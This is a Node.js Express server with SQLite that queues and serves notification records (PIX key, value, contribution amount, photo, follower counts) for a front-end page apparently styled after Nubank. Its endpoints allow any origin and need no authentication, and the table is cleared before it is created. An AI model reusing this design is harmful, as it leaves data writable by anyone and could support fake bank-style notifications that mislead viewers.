import express from 'express';
import Database from 'better-sqlite3';
import { randomUUID } from 'crypto';

const app = express();
const PORT = process.env.PORT || 3001;

const db = new Database('nubank.db');
db.pragma('journal_mode = WAL');
db.exec('DELETE FROM notifications');

db.exec(`
  CREATE TABLE IF NOT EXISTS notifications (
    id TEXT PRIMARY KEY,
    data TEXT NOT NULL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER DEFAULT (strftime('%s','now')),
    processed_at INTEGER
  )
`);

const insertStmt = db.prepare('INSERT OR REPLACE INTO notifications (id, data, status) VALUES (?, ?, ?)');
const selectPending = db.prepare("SELECT * FROM notifications WHERE status = 'pending' ORDER BY created_at DESC LIMIT 1");
const selectByNotifId = db.prepare("SELECT * FROM notifications WHERE json_extract(data, '$.id') = ? AND status = 'pending' ORDER BY created_at DESC LIMIT 1");
const processStmt = db.prepare("UPDATE notifications SET status = 'processed', processed_at = strftime('%s','now') WHERE id = ?");
const processByNotifIdStmt = db.prepare("UPDATE notifications SET status = 'processed', processed_at = strftime('%s','now') WHERE json_extract(data, '$.id') = ? AND status = 'pending'");
const markOlderReplaced = db.prepare("UPDATE notifications SET status = 'replaced' WHERE status = 'pending' AND id != ?");

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

app.get('/api/pending', (req, res) => {
  const row = selectPending.get();
  if (!row) return res.json({ pending: false });
  const notif = JSON.parse(row.data);
  res.json({ pending: true, notification: notif, dbId: row.id });
});

app.post('/api/notify', (req, res) => {
  const { id, name, username, pixKey, value, contributionAmount, photo, fullName, gender, months, followingCount, followerCount, alerta } = req.body;
  if (!id) return res.status(400).json({ error: 'missing id' });
  const dbId = randomUUID();

  markOlderReplaced.run(dbId);

  insertStmt.run(dbId, JSON.stringify({
    id, name, username, pixKey, value, contributionAmount, photo, fullName, gender, months, followingCount, followerCount, alerta
  }), 'pending');

  res.json({ ok: true, dbId });
});

app.post('/api/process/:dbId', (req, res) => {
  const { dbId } = req.params;
  processStmt.run(dbId);
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  const row = selectPending.get();
  res.json({ pending: !!row, dbId: row?.id || null });
});

app.post('/api/process-by-id/:notifId', (req, res) => {
  const { notifId } = req.params;
  const result = processByNotifIdStmt.run(notifId);
  res.json({ ok: true, changes: result.changes });
});

app.use(express.static('dist'));

app.get('/nubank', (req, res) => {
  res.redirect('/#/nubank');
});

app.get('*', (req, res) => {
  res.sendFile('index.html', { root: 'dist' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
  console.log(`Main app: http://localhost:${PORT}/`);
  console.log(`Nubank page: http://localhost:${PORT}/#/nubank`);
});
